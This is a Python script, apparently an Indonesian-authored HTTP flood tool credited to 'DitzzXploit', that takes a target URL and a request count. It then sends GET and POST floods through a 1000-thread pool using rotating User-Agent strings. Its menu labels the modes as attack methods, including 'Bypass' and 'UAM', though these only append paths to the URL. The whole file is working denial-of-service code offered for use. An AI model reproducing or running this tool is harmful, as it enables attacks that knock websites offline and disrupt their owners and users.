import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor

# Warna untuk output
RED = '\033[91m'
CYAN = '\033[96m'
RESET = '\033[0m'

# User-Agent List
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

# Fungsi untuk mengirim permintaan HTTP
def send_request(target_url, method):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        if method == "https":
            response = requests.get(target_url, headers=headers, timeout=5)
            response = requests.post(target_url, headers=headers, timeout=5)
        elif method == "flood":
            response = requests.post(target_url, headers=headers, data={"flood": "test"}, timeout=5)
        elif method == "bypass":
            response = requests.get(target_url + "/bypass", headers=headers, timeout=5)
        elif method == "uam":
            response = requests.get(target_url + "/uam", headers=headers, timeout=5)
        elif method == "tls":
            response = requests.get(target_url, headers=headers, timeout=5, verify=False)
        elif method == "r2":
            response = requests.get(target_url + "/r2", headers=headers, timeout=5)
        elif method == "gyat":
            response = requests.post(target_url, headers=headers, data={"gyat": "attack"}, timeout=5)

        print(f"{CYAN}[{method.upper()}]{RESET} Sent to {target_url} -> {RED}Status: {response.status_code}{RESET}")
    except Exception as e:
        print(f"{RED}[ERROR]{RESET} {method.upper()} failed: {e}")

# Fungsi untuk menjalankan serangan
def run_attack(target_url, method, num_requests):
    print(f"{RED}⚠️ Running {method.upper()} attack on {target_url} ⚠️{RESET}")
    with ThreadPoolExecutor(max_workers=1000) as executor:  # Membuat 1000 thread sekaligus
        for _ in range(num_requests):
            executor.submit(send_request, target_url, method)
    print(f"{CYAN}✅ Attack completed! ✅{RESET}")

# Fungsi untuk menampilkan menu
def display_menu():
    print(f"""
     {RED}============================================================{RESET}
                                      .....           :                          
                             :----::.              :+                           
                         :=+=:                   .**  .==.                      
                      :+*-                      =%*   %%%%*:                    
                    -#+.                      -#%*    .=#%%%#:                  
                  -#*.                      .*%%#        -#%%%+                 
                .*%-                       +%%%*           -#%%#.               
               :%#.                      -%%%%#              *%%%:              
              :%#                      :#%%%%*                =%%%.             
             :%%.                     +%%%%%*                  =%%#             
             #%-                    =%%%%%%#                    +%%=            
            =%#                   :#%%%%%%#                      %%%            
            #%+                 .*%%%%%%%%%##########-           +%%:           
           .%%-                =%%%%%%%%%%%%%%%%%%%+             -%%-           
           :%%-              :#%%%%%%%%%%%%%%%%%%*.              :%%-           
           .%%+            .*%%%%%%%%%%%%%%%%%%#-                :%%:           
            %%#           :+**********%%%%%%%%+                  =%%            
            *%%-                     #%%%%%%*.                   #%=            
            .%%%                    #%%%%%#-                    -%#             
             +%%*                  #%%%%%=                     .%%:             
              *%%#.               #%%%%*.                      #%:              
               *%%%:             #%%%#:                      .##.               
                +%%%*.          #%%%=                       -%+                 
                 :#%%%+:       #%%+.                      :**:                  
                   =%%%%#=    #%#:                      :**:                    
                     =#%%%.  #%-                     :=*=.       Create By DitzzXploit              
                       ::   #+                   .-=+-.                         
                           +:        .....::::---:                              
                          .             
{RED}=========================================================={RESET}
                      {RED}🔥 Attack Methods 🔥{RESET}
{RED}=========================================================={RESET}
1. {CYAN}Flood{RESET}
2. {CYAN}Bypass{RESET}
3. {CYAN}UAM{RESET}
4. {CYAN}TLS{RESET}
5. {CYAN}HTTPS{RESET}
6. {CYAN}R2{RESET}
7. {CYAN}Gyat{RESET}
""")

# Menu utama
if __name__ == "__main__":
    while True:
        display_menu()
        choice = input(f"{CYAN}Choose a method (1-7 or 'exit'): {RESET}").strip()
        if choice.lower() == 'exit':
            print(f"{RED}Exiting... Goodbye!{RESET}")
            break

        # Memetakan pilihan ke metode
        methods = {
            "1": "flood",
            "2": "bypass",
            "3": "uam",
            "4": "tls",
            "5": "https",
            "6": "r2",
            "7": "gyat"
        }

        method = methods.get(choice)
        if not method:
            print(f"{RED}Invalid choice, please try again.{RESET}")
            continue

        target_url = input(f"{CYAN}Enter target URL: {RESET}").strip()
        try:
            num_requests = int(input(f"{CYAN}Enter number of requests: {RESET}"))
        except ValueError:
            print(f"{RED}Invalid number of requests. Please enter a valid integer.{RESET}")
            continue

        run_attack(target_url, method, num_requests)
